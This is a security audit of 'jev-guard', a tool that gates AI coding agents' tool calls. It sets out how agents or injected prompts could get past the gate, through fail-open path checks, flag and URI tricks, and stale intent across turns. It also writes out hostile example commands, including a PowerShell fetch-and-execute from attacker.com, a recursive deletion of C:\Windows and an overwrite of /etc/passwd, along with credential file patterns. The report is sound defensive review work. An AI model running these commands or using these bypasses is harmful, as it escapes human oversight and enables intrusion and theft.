# Repository Security, Protocol, and Quality Review: `jev-guard`

**Review Date**: 2026-09-21  
**Scope**: Entire repository (`main.go`, `pkg/`, manifests, installers, workflows, documentation)  
**Status**: Comprehensive audit complete. Do not commit or alter functional code until reviewed.

---

## Executive Summary

A comprehensive, line-by-line inspection of the `jev-guard` codebase was performed across all security invariants, platform protocol adapters, fastpath filtering rules, session persistence layers, installation scripts, CI workflows, and documentation.

The review uncovered **23 major issues**, spanning critical security vulnerabilities (arbitrary code execution, secret API key leakage, fail-open boundary escapes, path traversal), platform protocol incompatibilities (Claude Code hook configuration and response schemas completely broken), runtime crashes and terminal deadlocks, concurrency race conditions on Windows, and broken build/CI dependencies.

### Severity Breakdown

| Severity | Count | Summary of Key Impacts |
| :--- | :---: | :--- |
| **CRITICAL** | **7** | Arbitrary code execution via PowerShell subexpressions in trusted commands; secret API key exfiltration via fastpath auto-allow on `.jevguard.json`; fail-open boundary resolver errors; Windows backslash bypass on `.ssh` and `.aws`; configuration hijacking via untrusted `TargetPath`; flag bypass allowing arbitrary file overwrite; MCP `read_resource` traversal. |
| **HIGH** | **5** | Claude Code hook configuration non-functional (invalid filename and schema); Claude Code PreToolUse protocol response schema mismatch; Claude Code UserPromptSubmit stdout prompt pollution; turn-ID intent leakage across turns; CLI panic on `jev-guard cache`. |
| **MEDIUM** | **6** | CLI interactive terminal hang on `ingest`; potential nil pointer dereference panic in `Config.LogAudit`; Windows reserved device name corruption (`con.json`); rigid abort regex causing stop command false negatives; Windows concurrent file locking and race conditions; case-insensitivity on Linux in boundary resolver. |
| **LOW** | **5** | Installer compiles arbitrary current working directory binaries; unreleased Go 1.27.0 in `go.mod` breaking CI; missing version metadata injection in local builds; missing sensitive file patterns (`.npmrc`, `kubeconfig`); README documentation discrepancies. |

---

## Table of Contents

1. [Category A: Security Vulnerabilities & Fastpath Invariant Bypasses](#category-a-security-vulnerabilities--fastpath-invariant-bypasses)
   - [SEC-01: Arbitrary Code Execution via PowerShell Parenthesis Subexpressions](#sec-01-arbitrary-code-execution-via-powershell-parenthesis-subexpressions)
   - [SEC-02: Secret API Key Exposure via Fastpath Auto-Allow on `.jevguard.json`](#sec-02-secret-api-key-exposure-via-fastpath-auto-allow-on-jevguardjson)
   - [SEC-03: Boundary Checker Fails Open on All Path Resolution Errors](#sec-03-boundary-checker-fails-open-on-all-path-resolution-errors)
   - [SEC-04: Windows Path Separator Bypass on Sensitive Directories (`.ssh/`, `.aws/`)](#sec-04-windows-path-separator-bypass-on-sensitive-directories-ssh-aws)
   - [SEC-05: Configuration Hijacking & Telemetry Exfiltration via Untrusted `TargetPath`](#sec-05-configuration-hijacking--telemetry-exfiltration-via-untrusted-targetpath)
   - [SEC-06: Command Flag Argument Bypass Allowing Arbitrary File Overwrites](#sec-06-command-flag-argument-bypass-allowing-arbitrary-file-overwrites)
   - [SEC-07: Unrestricted File Access via MCP `read_resource` with `file:///` URIs](#sec-07-unrestricted-file-access-via-mcp-read_resource-with-file-uris)
2. [Category B: Platform Integration & Protocol Breakages](#category-b-platform-integration--protocol-breakages)
   - [PROTO-01: Claude Code Hook Manifest Uses Unsupported Filename & Schema](#proto-01-claude-code-hook-manifest-uses-unsupported-filename--schema)
   - [PROTO-02: Claude Code PreToolUse Protocol Response Schema Mismatch](#proto-02-claude-code-pretooluse-protocol-response-schema-mismatch)
   - [PROTO-03: Claude Code UserPromptSubmit Stdout Injects Hook Telemetry into User Prompts](#proto-03-claude-code-userpromptsubmit-stdout-injects-hook-telemetry-into-user-prompts)
   - [PROTO-04: Context Awareness Intent Bleed Across Interaction Turns](#proto-04-context-awareness-intent-bleed-across-interaction-turns)
3. [Category C: Runtime Crashes, Panics & Interactive Process Hangs](#category-c-runtime-crashes-panics--interactive-process-hangs)
   - [STAB-01: CLI Panic on `jev-guard cache` (Index Out of Range)](#stab-01-cli-panic-on-jev-guard-cache-index-out-of-range)
   - [STAB-02: Indefinite Terminal Hang on `jev-guard ingest` Without Prompt](#stab-02-indefinite-terminal-hang-on-jev-guard-ingest-without-prompt)
   - [STAB-03: Potential Nil Pointer Dereference Panic in `Config.LogAudit`](#stab-03-potential-nil-pointer-dereference-panic-in-configlogaudit)
   - [STAB-04: Windows Reserved Device Name Corruption in Session Caching (`CON`, `PRN`, `NUL`)](#stab-04-windows-reserved-device-name-corruption-in-session-caching-con-prn-nul)
4. [Category D: Logic Errors, Concurrency & State Inconsistencies](#category-d-logic-errors-concurrency--state-inconsistencies)
   - [LOGIC-01: Session Abort Detection Regex Fails on Common Human Stop Commands](#logic-01-session-abort-detection-regex-fails-on-common-human-stop-commands)
   - [LOGIC-02: Concurrency Race Condition & Handle Lock Failure on Windows in `SaveSession`](#logic-02-concurrency-race-condition--handle-lock-failure-on-windows-in-savesession)
   - [LOGIC-03: Case-Insensitivity Folding on Case-Sensitive Linux Filesystems](#logic-03-case-insensitivity-folding-on-case-sensitive-linux-filesystems)
   - [LOGIC-04: Missing Critical Sensitive Patterns in Default Configuration](#logic-04-missing-critical-sensitive-patterns-in-default-configuration)
5. [Category E: Build, Packaging, Installer & CI Defects](#category-e-build-packaging-installer--ci-defects)
   - [BUILD-01: Installer Compiles Arbitrary Current Working Directory Binaries](#build-01-installer-compiles-arbitrary-current-working-directory-binaries)
   - [BUILD-02: Unreleased Go 1.27.0 Version Specified in `go.mod` Fails CI Runners](#build-02-unreleased-go-1270-version-specified-in-gomod-fails-ci-runners)
   - [BUILD-03: Local Installer Builds Omit Compile-Time Version Metadata](#build-03-local-installer-builds-omit-compile-time-version-metadata)
   - [BUILD-04: Documentation Discrepancies in README.md](#build-04-documentation-discrepancies-in-readmemd)

---

## Category A: Security Vulnerabilities & Fastpath Invariant Bypasses

### SEC-01: Arbitrary Code Execution via PowerShell Parenthesis Subexpressions
- **Severity**: **CRITICAL**
- **Affected File**: [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L272-L280)
- **Functions**: `containsChainingOperators`, `areCommandArgsContained`

#### Vulnerability Details
The fastpath filter inspects commands matching trusted prefixes (`git status`, `echo`, `dir`, `ls`, etc.) and permits zero-latency execution (`ALLOW`) if `containsChainingOperators` returns `false`:
```go
func containsChainingOperators(cmd string) bool {
	operators := []string{";", "&", "|", ">", "`", "$(", "\n", "\r"}
	for _, op := range operators {
		if strings.Contains(cmd, op) {
			return true
		}
	}
	return false
}
```
In PowerShell, parentheses `(...)` without a leading `$` evaluate arbitrary subexpression pipelines and pass their output as arguments to the parent command. For example:
- `echo (Remove-Item C:\Windows -Recurse -Force)`
- `git status (Invoke-RestMethod http://attacker.com/payload.ps1 | Invoke-Expression)`
- `whoami (Start-Process calc.exe)`

Because `(` and `)` are not included in `containsChainingOperators`, and `areCommandArgsContained` skips arguments that do not look like standard filesystem paths, fastpath returns `DecisionAllow` ("Trusted read-only operation verified by fast-path"). Any agent or injected prompt can execute arbitrary PowerShell commands with zero gating.

#### Remediation
Expand `containsChainingOperators` to block PowerShell subexpression delimiters `(`, `)`, `{`, `}`, `@(`, and input redirection `<`. For trusted command evaluation, strictly parse arguments with a token parser rather than relying on an incomplete blacklist of chaining characters.

---

### SEC-02: Secret API Key Exposure via Fastpath Auto-Allow on `.jevguard.json`
- **Severity**: **CRITICAL**
- **Affected Files**:
  - [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L91-L106)
  - [`pkg/session/session.go`](file:///c:/dev/jev-guard/pkg/session/session.go#L218-L255)
  - [`pkg/config/config.go`](file:///c:/dev/jev-guard/pkg/config/config.go#L65-L78)

#### Vulnerability Details
The project configuration file `.jevguard.json` (or `jevguard.json`) stored in the workspace root frequently contains the `typesafe_api_key`.
When an agent invokes a read tool (`view_file`, `View`, `read_file`) targeting `.jevguard.json`:
1. `f.checkAntiTampering(call)` calls `session.IsJevguardPath(call.TargetPath)`.
2. `IsJevguardPath` checks if any path segment strictly equals `".jevguard"` or is a subpath of `~/.jevguard`. It does **not** check for `.jevguard.json` or `jevguard.json`.
3. `DefaultSensitiveFiles()` in `config.go` does not list `.jevguard.json`.
4. The file resides inside the workspace root, so boundary checks pass.
5. `isSafeReadTool("view_file")` returns `true`.
6. Fastpath immediately returns `DecisionAllow` (`fastpath_trusted`).

An LLM agent can read `.jevguard.json` via standard inspection tools, extracting the private TypeSafe API key with zero human confirmation or semantic check.

#### Remediation
1. Explicitly protect `.jevguard.json` and `jevguard.json` in `checkAntiTampering`.
2. Add `.jevguard.json` and `jevguard.json` to `DefaultSensitiveFiles()`.

---

### SEC-03: Boundary Checker Fails Open on All Path Resolution Errors
- **Severity**: **CRITICAL**
- **Affected Files**:
  - [`main.go`](file:///c:/dev/jev-guard/main.go#L100-L109)
  - [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L160-L164)
  - [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L238-L242)

#### Vulnerability Details
All three boundary containment checks fail open when `IsPathContained` returns an error:
```go
// In main.go:
func checkWorkspaceBoundary(call *harness.NormalizedToolCall, resolver *boundary.Resolver) bool {
	if resolver == nil {
		return true // FAILS OPEN
	}
	contained, err := resolver.IsPathContained(call.TargetPath, call.Cwd)
	if err != nil {
		return true // FAILS OPEN: treats resolution errors as contained!
	}
	return contained
}

// In pkg/fastpath/filter.go:
contained, err := checker.IsPathContained(target, call.Cwd)
if err != nil {
	return "" // FAILS OPEN: ignores errors and proceeds to auto-allow!
}
```
If a tool call supplies a path with null bytes, unsupported control characters, unresolvable symlink chains, or illegal Win32 syntax, `IsPathContained` fails with an error. The guard treats this as `contained = true` / no boundary escape, bypassing local containment protection.

#### Remediation
Enforce fail-closed semantics: any error resolving a path must be treated as `contained = false` and trigger an escalation (`DecisionAsk` or `DecisionForceAsk`).

---

### SEC-04: Windows Path Separator Bypass on Sensitive Directories (`.ssh/`, `.aws/`)
- **Severity**: **CRITICAL**
- **Affected File**: [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L108-L146)
- **Function**: `checkSensitive`

#### Vulnerability Details
`DefaultSensitiveFiles()` registers sensitive directory patterns with POSIX forward slashes: `".ssh/"` and `".aws/"`.
In `checkSensitive`:
```go
target := strings.ToLower(call.TargetPath)
cleanPattern := strings.TrimPrefix(lowerPattern, "*")
if cleanPattern != "" && (strings.Contains(target, cleanPattern) ...) {
    return "Access to sensitive file or credential pattern: " + s
}
```
On Windows, `call.TargetPath` uses backslashes (e.g. `C:\Users\user\.ssh\config` or `C:\Users\user\.aws\credentials`).
`target` does not contain `".ssh/"` or `".aws/"`. Furthermore, `filepath.Match` does not match wildcards across path separators.
Consequently, any read or write targeting `.ssh` or `.aws` directory files on Windows completely slips through `checkSensitive`.

#### Remediation
Normalize separators in `target`, `baseName`, and `cmd` using `filepath.ToSlash(...)` before matching, and check for directory segments matching `.ssh` and `.aws`.

---

### SEC-05: Configuration Hijacking & Telemetry Exfiltration via Untrusted `TargetPath`
- **Severity**: **CRITICAL**
- **Affected File**: [`pkg/config/config.go`](file:///c:/dev/jev-guard/pkg/config/config.go#L107-L126), [`pkg/config/config.go`](file:///c:/dev/jev-guard/pkg/config/config.go#L140-L174)
- **Functions**: `collectCandidates`, `FindConfigFile`

#### Vulnerability Details
When loading configuration for a tool call:
```go
func collectCandidates(call *harness.NormalizedToolCall) []string {
...
	if call.TargetPath != "" {
		candidates = append(candidates, filepath.Dir(call.TargetPath))
	}
...
}
```
If an agent targets a file in an untrusted directory (e.g. an unzipped archive, `/tmp/malicious/repo/file.go`), `FindConfigFile` walks ancestor directories starting from `filepath.Dir(call.TargetPath)`.
If `/tmp/malicious/.jevguard.json` exists, `jev-guard` loads its configuration.
A malicious `.jevguard.json` can:
1. Set `"mode": "audit"`, disabling all enforcement and silently approving catastrophic operations.
2. Set `"base_url": "https://attacker.com/steal"`, routing the user's intent, prompt, and tool arguments directly to an attacker-controlled server.

#### Remediation
Never search for `.jevguard.json` starting from untrusted `TargetPath`. Configuration discovery must strictly be confined to the calling agent's current working directory (`call.Cwd`) and verified workspace roots (`call.WorkspaceRoots`).

---

### SEC-06: Command Flag Argument Bypass Allowing Arbitrary File Overwrites
- **Severity**: **CRITICAL**
- **Affected File**: [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L233-L236)
- **Function**: `areCommandArgsContained`

#### Vulnerability Details
When validating arguments of trusted commands (`git diff`, `git log`, etc.):
```go
for _, token := range tokens {
	cleanArg := strings.Trim(token, `"'`)
	if strings.HasPrefix(cleanArg, "-") {
		continue // BYPASS: any argument starting with '-' is skipped
	}
```
Any command flag of the format `--flag=path` or `-o=path` begins with `-` and is skipped without boundary verification.
For example:
- `git diff --output=/etc/passwd`
- `git log --output=C:\Windows\System32\drivers\etc\hosts`
Because `git diff` is in `TrustedCommands` and `--output=...` begins with `-`, `areCommandArgsContained` returns `true`, and fastpath returns `DecisionAllow`. This allows writing diffs or logs over arbitrary files outside the workspace.

#### Remediation
Parse flag arguments that take file parameters (e.g. `--output=`, `-o=`), extract the assigned path value, and run `checker.IsPathContained` on it.

---

### SEC-07: Unrestricted File Access via MCP `read_resource` with `file:///` URIs
- **Severity**: **CRITICAL**
- **Affected Files**:
  - [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L151)
  - [`pkg/fastpath/filter.go`](file:///c:/dev/jev-guard/pkg/fastpath/filter.go#L262-L270)
- **Functions**: `checkBoundaryEscape`, `isSafeReadTool`

#### Vulnerability Details
`read_resource` is included in `isSafeReadTool`. The argument `Uri` is extracted as `call.TargetPath`.
When an agent calls `read_resource` with a URI like `file:///C:/Windows/system.ini` or `file:///etc/shadow`:
1. `isURL("file:///...")` returns `false` (it only checks `http://` and `https://`).
2. `IsPathContained` attempts `canonicalizePath("file:///...")`. Because `file:///` is not a valid filesystem path syntax for `filepath.Abs`, it returns an error.
3. As detailed in SEC-03, `checkBoundaryEscape` ignores the error (`if err != nil { return "" }`).
4. `isSafeReadTool("read_resource")` returns `true`.
5. Fastpath emits `DecisionAllow`.

Any file on the filesystem can be exfiltrated via MCP `read_resource` using a `file://` URI without triggering a boundary check or prompt.

#### Remediation
Strip `file://` / `file:///` schemes to extract the underlying filesystem path before checking boundaries, or do not treat `read_resource` as a fastpath-approved tool without semantic evaluation.

---

## Category B: Platform Integration & Protocol Breakages

### PROTO-01: Claude Code Hook Manifest Uses Unsupported Filename & Schema
- **Severity**: **HIGH**
- **Affected File**: [`.claude/hooks.json`](file:///c:/dev/jev-guard/.claude/hooks.json#L1-L17)

#### Defect Details
Claude Code does not recognize or load `.claude/hooks.json`. In Claude Code, hooks must be declared inside `settings.json` (i.e. `.claude/settings.json` for workspace scope, or `~/.claude/settings.json` for global scope).
Furthermore, Claude Code hook configuration requires a three-level nested structure:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "...",
        "hooks": [
          {
            "type": "command",
            "command": "jev-guard"
          }
        ]
      }
    ]
  }
}
```
The repository's `.claude/hooks.json` uses a flat `"command": "..."` structure without the inner `hooks` array. Claude Code will completely ignore this file, leaving Claude Code unprotected.

#### Remediation
Replace `.claude/hooks.json` with a valid `.claude/settings.json` conforming to Claude Code's schema.

---

### PROTO-02: Claude Code PreToolUse Protocol Response Schema Mismatch
- **Severity**: **HIGH**
- **Affected Files**:
  - [`pkg/harness/types.go`](file:///c:/dev/jev-guard/pkg/harness/types.go#L73-L82)
  - [`pkg/harness/adapter.go`](file:///c:/dev/jev-guard/pkg/harness/adapter.go#L264-L283)
- **Functions**: `formatClaudeResponse`

#### Defect Details
When approving a tool call for Claude Code, `formatClaudeResponse` outputs:
```json
{
  "hookSpecificOutput": {
    "action": "allow",
    "message": "Safe read command"
  }
}
```
Claude Code's PreToolUse hook protocol expects:
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "permissionDecisionReason": "Safe read command"
  }
}
```
Because the fields are named `action` and `message` instead of `permissionDecision` and `permissionDecisionReason`, Claude Code may fail to parse the verdict and fall back to its internal default behavior.

#### Remediation
Update `ClaudeHookAction` in `types.go` and `formatClaudeResponse` in `adapter.go` to conform strictly to Claude Code's specification.

---

### PROTO-03: Claude Code UserPromptSubmit Stdout Injects Hook Telemetry into User Prompts
- **Severity**: **HIGH**
- **Affected File**: [`pkg/cli/cli.go`](file:///c:/dev/jev-guard/pkg/cli/cli.go#L185-L189)
- **Function**: `handleIngest`

#### Defect Details
In Claude Code, any text written to `stdout` by a `UserPromptSubmit` hook is automatically prepended to the user's message as context injection before being delivered to the LLM.
When `jev-guard ingest` executes, it prints:
```text
Session intent recorded for session 'default' (turn: 0)
```
or upon abort:
```text
Abort signal recorded for session 'default' (active intent cancelled)
```
Consequently, every prompt sent by a human operator in Claude Code is polluted with this telemetry message at the start of their instruction.

#### Remediation
When invoked under `UserPromptSubmit` or when output is stdout in CLI ingest mode, keep `stdout` empty (or write diagnostic messages to `stderr` only).

---

### PROTO-04: Context Awareness Intent Bleed Across Interaction Turns
- **Severity**: **HIGH**
- **Affected Files**:
  - [`main.go`](file:///c:/dev/jev-guard/main.go#L44-L62)
  - [`pkg/harness/types.go`](file:///c:/dev/jev-guard/pkg/harness/types.go#L33)

#### Defect Details
`NormalizedToolCall` captures `TurnID` (e.g. Antigravity's `invocationNum`), and `SessionState` records `TurnID`. However, `runGate()` in `main.go` only checks whether `sessState.Aborted` is set:
```go
if sessState, sessErr := session.LoadSession(sessionID); sessErr == nil && sessState != nil {
	if sessState.Aborted { ... }
	call.UserIntent = sessState.Prompt
}
```
It never compares `call.TurnID` with `sessState.TurnID`.
If a user explicitly commands `Delete the build directory` in Turn 1, that prompt remains active in the session cache for 60 minutes. If the agent executes unrelated tool calls in Turn 15, `call.UserIntent` is still populated with `Delete the build directory`, inappropriately granting explicit intent authorization to subsequent actions.

#### Remediation
Track turn progression: if `call.TurnID > sessState.TurnID`, the intent from the prior turn should be treated as stale or cleared.

---

## Category C: Runtime Crashes, Panics & Interactive Process Hangs

### STAB-01: CLI Panic on `jev-guard cache` (Index Out of Range)
- **Severity**: **HIGH**
- **Affected File**: [`pkg/cli/cli.go`](file:///c:/dev/jev-guard/pkg/cli/cli.go#L80-L88)
- **Function**: `handleArgs`

#### Defect Details
Running `jev-guard cache` with no additional arguments triggers an unhandled slice boundary panic:
```go
case "cache":
	if len(args) > 1 && strings.EqualFold(args[1], "clear") {
		return r.handleClearIntent(args[2:])
	}
	if len(args) > 1 && strings.EqualFold(args[1], "status") {
		return r.handleStatus()
	}
	return r.handleUnknown(args[0] + " " + args[1]) // CRASH: accesses args[1] when len(args) == 1!
```
Verified reproduction:
```text
panic: runtime error: index out of range [1] with length 1
goroutine 1 [running]:
jev-guard/pkg/cli.(*Runner).handleArgs(...)
    C:/dev/jev-guard/pkg/cli/cli.go:87
```

#### Remediation
Guard the call with `if len(args) > 1` and display a clear error message or help text when `len(args) == 1`.

---

### STAB-02: Indefinite Terminal Hang on `jev-guard ingest` Without Prompt
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/cli/cli.go`](file:///c:/dev/jev-guard/pkg/cli/cli.go#L143-L163)
- **Function**: `handleIngest`

#### Defect Details
When `jev-guard ingest` is executed without `--prompt` (e.g. `jev-guard ingest --session my-sess`), line 143 executes:
```go
if prompt == "" && r.Stdin != nil {
	stdinBytes, err := io.ReadAll(r.Stdin)
```
Unlike `EvaluateArgs` (which checks `r.IsTerminal()` before handling gate evaluation), `handleIngest` does **not** check whether `r.Stdin` is an interactive terminal. As a result, the process hangs indefinitely waiting for EOF (`Ctrl+D` / `Ctrl+Z`), confusing users.

#### Remediation
Check `if r.IsTerminal != nil && r.IsTerminal()` inside `handleIngest` and return an error immediately if no prompt was provided and stdin is an interactive terminal.

---

### STAB-03: Potential Nil Pointer Dereference Panic in `Config.LogAudit`
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/config/config.go`](file:///c:/dev/jev-guard/pkg/config/config.go#L305-L320)
- **Function**: `LogAudit`

#### Defect Details
In `LogAudit`:
```go
entry := AuditEntry{
	Timestamp:  time.Now().UTC().Format(time.RFC3339),
	ToolName:   call.ToolName,
	Command:    call.Command,
	TargetPath: call.TargetPath,
	Decision:   res.Decision,
...
}
```
If `call == nil` (for instance, when logging fatal errors where input parsing failed before a `NormalizedToolCall` was created, as in `main.go:34`), accessing `call.ToolName` results in an instant runtime nil pointer panic.

#### Remediation
Add nil checks for `call` and `res` in `LogAudit`.

---

### STAB-04: Windows Reserved Device Name Corruption in Session Caching (`CON`, `PRN`, `NUL`)
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/session/session.go`](file:///c:/dev/jev-guard/pkg/session/session.go#L53-L67)
- **Function**: `SafeSessionFileName`

#### Defect Details
`SafeSessionFileName` uses `safeSessionIDRegex = regexp.MustCompile("^[a-zA-Z0-9_-]+$")`.
On Windows, file names matching DOS device names (such as `con.json`, `prn.json`, `aux.json`, `nul.json`, `com1.json`–`com9.json`, `lpt1.json`–`lpt9.json`) are treated as system device handles by the Win32 subsystem. Attempting to write or delete `con.json` fails, hangs, or corrupts console output.

#### Remediation
Check for reserved Windows device names (case-insensitively) and force them through SHA-256 hash generation rather than raw filename emission.

---

## Category D: Logic Errors, Concurrency & State Inconsistencies

### LOGIC-01: Session Abort Detection Regex Fails on Common Human Stop Commands
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/session/session.go`](file:///c:/dev/jev-guard/pkg/session/session.go#L21)

#### Defect Details
`abortPattern` is defined as:
```go
abortPattern = regexp.MustCompile(`(?i)^\s*((stop|cancel|abort|halt|quit)\s*([!.]|$|\b(that|it|now|all|everything|execution|operation)\b)|(stop|cancel|abort|halt)!\s*.*|(don'?t|do\s+not)\s+(do\s+that|run\s+that|proceed|continue)\b)`)
```
This regex fails to recognize many natural human stop commands:
- `"please stop"` (does not start with a verb)
- `"wait, stop"` (does not start with a verb)
- `"stop running"` (`running` is not in the whitelist)
- `"cancel the build"` (`the` is not in the whitelist)
- `"abort the operation"` (`the` is not in the whitelist)
- `"do not run this"` (only matches `that`)
- `"don't delete that"` (only matches `do that` or `run that`)

When a user issues these stop instructions, `IsNegativeIntent` returns `false`. Not only is the abort signal missed, but the abort phrase is saved as a **positive user prompt**, which may authorize destructive actions.

#### Remediation
Refine `abortPattern` to be more resilient to leading polite qualifiers (`please`, `wait`, `hey`), articles (`the`, `this`), and gerunds (`running`, `deleting`, `executing`).

---

### LOGIC-02: Concurrency Race Condition & Handle Lock Failure on Windows in `SaveSession`
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/session/session.go`](file:///c:/dev/jev-guard/pkg/session/session.go#L106-L121)
- **Function**: `SaveSession`

#### Defect Details
```go
if err := os.Rename(tempPath, targetPath); err != nil {
	_ = os.Remove(targetPath)
	if retryErr := os.Rename(tempPath, targetPath); retryErr != nil {
		_ = os.Remove(tempPath)
		return fmt.Errorf("failed to commit session file: %w", retryErr)
	}
}
```
1. On Windows, `os.Rename` consistently fails if the target exists.
2. The fallback executes `os.Remove(targetPath)` followed by `os.Rename`. Between the removal and the rename, `targetPath` does not exist. If a concurrent tool call calls `LoadSession`, it receives `nil, nil` (session vanished).
3. If another process has `targetPath` open for reading, `os.Remove` fails on Windows with sharing violation (`Access is denied`), causing `SaveSession` to fail.
4. If a process terminates abnormally, orphaned `.tmp.*` files remain on disk indefinitely because `ClearAllSessions` and `ListSessions` only match `*.json`.

#### Remediation
Implement proper atomic file writing using file locking or platform-specific atomic replace APIs (`MoveFileExW` with `MOVEFILE_REPLACE_EXISTING` on Windows), and clean up orphaned `.tmp.*` files during session listing/clearing.

---

### LOGIC-03: Case-Insensitivity Folding on Case-Sensitive Linux Filesystems
- **Severity**: **MEDIUM**
- **Affected File**: [`pkg/boundary/resolver.go`](file:///c:/dev/jev-guard/pkg/boundary/resolver.go#L158-L172)
- **Function**: `isSubPath`

#### Defect Details
`isSubPath` converts both parent and child paths to lowercase via `strings.ToLower`:
```go
normParent := strings.ToLower(normalizeSeparators(filepath.Clean(parent)))
normChild := strings.ToLower(normalizeSeparators(filepath.Clean(child)))
```
On Linux, filesystems are case-sensitive. `/home/user/App` and `/home/user/app` are two completely different directories. If the workspace root is `/home/user/App`, an operation targeting `/home/user/app/secret.txt` will be classified as contained inside the workspace.

#### Remediation
Apply `strings.ToLower` only when `runtime.GOOS == "windows"` (or on macOS where the filesystem is case-preserving but insensitive), preserving case on Linux.

---

### LOGIC-04: Missing Critical Sensitive Patterns in Default Configuration
- **Severity**: **LOW**
- **Affected File**: [`pkg/config/config.go`](file:///c:/dev/jev-guard/pkg/config/config.go#L65-L78)
- **Function**: `DefaultSensitiveFiles`

#### Defect Details
`DefaultSensitiveFiles` omits several common developer credential files:
- `.npmrc` / `.yarnrc` (npm registry auth tokens)
- `.pypirc` (PyPI publishing credentials)
- `.git-credentials` / `.gitconfig` (plaintext git tokens)
- `id_ecdsa` / `id_dsa` (SSH private keys)
- `kubeconfig` / `~/.kube/config` (Kubernetes cluster administrator keys)
- `docker/config.json` (Container registry credentials)

#### Remediation
Add these high-risk patterns to `DefaultSensitiveFiles()`.

---

## Category E: Build, Packaging, Installer & CI Defects

### BUILD-01: Installer Compiles Arbitrary Current Working Directory Binaries
- **Severity**: **LOW**
- **Affected Files**:
  - [`install.ps1`](file:///c:/dev/jev-guard/install.ps1#L19-L21)
  - [`install.sh`](file:///c:/dev/jev-guard/install.sh#L19-L21)

#### Defect Details
Both installer scripts check if Go is installed and if a `main.go` file exists in the current directory:
```powershell
if ((Get-Command go -ErrorAction SilentlyContinue) -and (Test-Path ".\main.go")) {
    Write-Host "Building jev-guard from local source with Go..."
    go build -ldflags="-s -w" -o $BinaryTarget .\main.go
}
```
If a developer runs `irm .../install.ps1 | iex` or `curl .../install.sh | bash` while their terminal is inside another Go project (e.g. `C:\dev\my-web-app\`), the installer compiles `my-web-app`'s `main.go` and installs it as `~/.jevguard/bin/jev-guard`!

#### Remediation
Verify that `go.mod` exists and contains `module jev-guard` before attempting to compile from source.

---

### BUILD-02: Unreleased Go 1.27.0 Version Specified in `go.mod` Fails CI Runners
- **Severity**: **LOW**
- **Affected Files**:
  - [`go.mod`](file:///c:/dev/jev-guard/go.mod#L3)
  - [`.github/workflows/ci.yml`](file:///c:/dev/jev-guard/.github/workflows/ci.yml#L26)
  - [`.github/workflows/release.yml`](file:///c:/dev/jev-guard/.github/workflows/release.yml#L41)

#### Defect Details
Line 3 of `go.mod` specifies:
```text
go 1.27.0
```
Both `ci.yml` and `release.yml` use:
```yaml
- name: Set up Go
  uses: actions/setup-go@v5
  with:
    go-version-file: 'go.mod'
```
Because Go 1.27.0 is not a released version of Go on standard distribution mirrors, GitHub Actions runners will fail during `setup-go` when building or testing on GitHub CI.

#### Remediation
Change `go.mod` to a released version of Go (e.g. `go 1.23.0` or `go 1.22.0`).

---

### BUILD-03: Local Installer Builds Omit Compile-Time Version Metadata
- **Severity**: **LOW**
- **Affected Files**:
  - [`install.ps1`](file:///c:/dev/jev-guard/install.ps1#L21)
  - [`install.sh`](file:///c:/dev/jev-guard/install.sh#L21)

#### Defect Details
While `.github/workflows/release.yml` injects `Version`, `Commit`, and `Date` via `-ldflags -X`, the installer scripts compile with only `-ldflags="-s -w"`. As a result, binaries compiled via `install.ps1` or `install.sh` output `jev-guard version 0.1.0 (commit: none, built: unknown)` when running `jev-guard --version`.

#### Remediation
Inject git tag/commit/date metadata in the installer build flags.

---

### BUILD-04: Documentation Discrepancies in README.md
- **Severity**: **LOW**
- **Affected File**: [`README.md`](file:///c:/dev/jev-guard/README.md)

#### Defect Details
1. Line 196 states that the default Base URL is `"https://api.typesafe.ai"`, whereas `pkg/evaluator/typesafe.go:17` defines `DefaultBaseURL = "https://api.typesafe.ai/v1/systemone"`.
2. Lines 236–253 document Claude Code hook setup referencing `.claude/hooks.json` with an invalid format (see PROTO-01).

#### Remediation
Update README.md to reflect the accurate API URL and Claude Code `settings.json` format.

---

## Remediation Roadmap

```
Phase 1: Critical Security Fixes
├── Patch PowerShell parentheses ACE in containsChainingOperators (SEC-01)
├── Protect .jevguard.json from fastpath auto-allow read exposure (SEC-02)
├── Change boundary resolution errors to FAIL CLOSED (SEC-03)
├── Fix Windows separator backslash matching for .ssh and .aws (SEC-04)
├── Restrict config search to cwd/workspace roots, ignoring TargetPath (SEC-05)
├── Verify command flag arguments in areCommandArgsContained (SEC-06)
└── Correct file:/// URI handling in read_resource (SEC-07)

Phase 2: Protocol & Crash Fixes
├── Update Claude Code hook manifest to .claude/settings.json (PROTO-01)
├── Update Claude Code PreToolUse response schema (PROTO-02)
├── Suppress stdout output during UserPromptSubmit ingest (PROTO-03)
├── Enforce turn-ID validity on session intent (PROTO-04)
├── Fix panic on `jev-guard cache` (STAB-01)
└── Prevent terminal hang on `jev-guard ingest` (STAB-02)

Phase 3: State & Concurrency Hardening
├── Guard against nil pointers in LogAudit (STAB-03)
├── Sanitize Windows reserved device names in session filenames (STAB-04)
├── Expand abort detection regex (LOGIC-01)
├── Harden atomic file saves on Windows (LOGIC-02)
└── Restrict case-folding in boundary resolver to Windows (LOGIC-03)

Phase 4: Build, Packaging & Documentation
├── Verify module name in install.ps1 / install.sh before building (BUILD-01)
├── Revert go.mod version to a stable release (e.g. 1.23.0) (BUILD-02)
├── Inject git metadata in local installer builds (BUILD-03)
└── Update README.md discrepancies (BUILD-04)
```
